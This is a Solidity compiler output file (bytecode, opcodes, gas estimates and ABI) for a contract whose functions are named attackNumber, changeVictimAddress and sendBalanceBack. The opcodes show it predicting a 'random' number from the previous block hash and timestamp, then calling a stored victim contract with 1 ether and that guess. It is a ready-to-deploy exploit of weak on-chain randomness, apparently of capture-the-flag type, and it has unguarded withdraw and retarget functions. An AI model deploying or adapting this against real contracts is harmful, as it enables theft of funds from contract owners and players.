{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405260405160208061050e83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610498806100766000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063325ec7681461006f5780637ab3d42514610091578063ba3ca1eb146100e8578063dfcc8ce114610119578063ed90e20814610148575b005b61007761018b565b604051808215151515815260200191505060405180910390f35b34801561009d57600080fd5b506100a66101c1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156100f457600080fd5b506100fd6101ea565b604051808260ff1660ff16815260200191505060405180910390f35b34801561012557600080fd5b5061012e610398565b604051808215151515815260200191505060405180910390f35b34801561015457600080fd5b50610189600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610429565b005b60008060003411151561019d57600080fd5b60003073ffffffffffffffffffffffffffffffffffffffff16311190508091505090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600080600080600092506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691506001430340426040518083600019166000191681526020018281526020019250505060405180910390206001900490508173ffffffffffffffffffffffffffffffffffffffff16634ba4c16b670de0b6b3a7640000836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff1660ff1681526020019150506000604051808303818588803b1580156102c557600080fd5b505af11580156102d9573d6000803e3d6000fd5b50505050508173ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15801561034257600080fd5b505af1158015610356573d6000803e3d6000fd5b505050506040513d602081101561036c57600080fd5b81019080805190602001909291905050509250821561038d57809350610392565b600093505b50505090565b60003373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103f7573d6000803e3d6000fd5b5060003073ffffffffffffffffffffffffffffffffffffffff163114156104215760019050610426565b600090505b90565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505600a165627a7a72305820ca1018f1921466f73209a68c23e3a50c0316a83654777f9fcb8405f8b80b2ddf0029",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x50E DUP4 CODECOPY DUP2 ADD DUP1 PUSH1 0x40 MSTORE DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x498 DUP1 PUSH2 0x76 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x6D JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x325EC768 EQ PUSH2 0x6F JUMPI DUP1 PUSH4 0x7AB3D425 EQ PUSH2 0x91 JUMPI DUP1 PUSH4 0xBA3CA1EB EQ PUSH2 0xE8 JUMPI DUP1 PUSH4 0xDFCC8CE1 EQ PUSH2 0x119 JUMPI DUP1 PUSH4 0xED90E208 EQ PUSH2 0x148 JUMPI JUMPDEST STOP JUMPDEST PUSH2 0x77 PUSH2 0x18B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA6 PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xFD PUSH2 0x1EA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x125 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12E PUSH2 0x398 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x154 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x189 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x429 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 CALLVALUE GT ISZERO ISZERO PUSH2 0x19D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT SWAP1 POP DUP1 SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 SWAP3 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP2 POP PUSH1 0x1 NUMBER SUB BLOCKHASH TIMESTAMP PUSH1 0x40 MLOAD DUP1 DUP4 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH1 0x1 SWAP1 DIV SWAP1 POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4BA4C16B PUSH8 0xDE0B6B3A7640000 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2D9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB2FA1C9E PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x342 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x356 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x36C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP3 POP DUP3 ISZERO PUSH2 0x38D JUMPI DUP1 SWAP4 POP PUSH2 0x392 JUMP JUMPDEST PUSH1 0x0 SWAP4 POP JUMPDEST POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE EQ ISZERO PUSH2 0x421 JUMPI PUSH1 0x1 SWAP1 POP PUSH2 0x426 JUMP JUMPDEST PUSH1 0x0 SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xca LT XOR CALL SWAP3 EQ PUSH7 0xF73209A68C23E3 0xa5 0xc SUB AND 0xa8 CALLDATASIZE SLOAD PUSH24 0x7F9FCB8405F8B80B2DDF0029000000000000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "235200",
				"executionCost": "20604",
				"totalCost": "255804"
			},
			"external": {
				"": "173",
				"attackNumber()": "infinite",
				"changeVictimAddress(address)": "20552",
				"getVictimAddress()": "472",
				"sendBalanceBack()": "infinite",
				"sendEtherToContract()": "642"
			}
		},
		"methodIdentifiers": {
			"attackNumber()": "ba3ca1eb",
			"changeVictimAddress(address)": "ed90e208",
			"getVictimAddress()": "7ab3d425",
			"sendBalanceBack()": "dfcc8ce1",
			"sendEtherToContract()": "325ec768"
		}
	},
	"abi": [
		{
			"constant": false,
			"inputs": [],
			"name": "sendEtherToContract",
			"outputs": [
				{
					"name": "",
					"type": "bool"
				}
			],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "getVictimAddress",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [],
			"name": "attackNumber",
			"outputs": [
				{
					"name": "",
					"type": "uint8"
				}
			],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [],
			"name": "sendBalanceBack",
			"outputs": [
				{
					"name": "",
					"type": "bool"
				}
			],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_addr",
					"type": "address"
				}
			],
			"name": "changeVictimAddress",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"name": "_addr",
					"type": "address"
				}
			],
			"payable": true,
			"stateMutability": "payable",
			"type": "constructor"
		},
		{
			"payable": true,
			"stateMutability": "payable",
			"type": "fallback"
		}
	]
}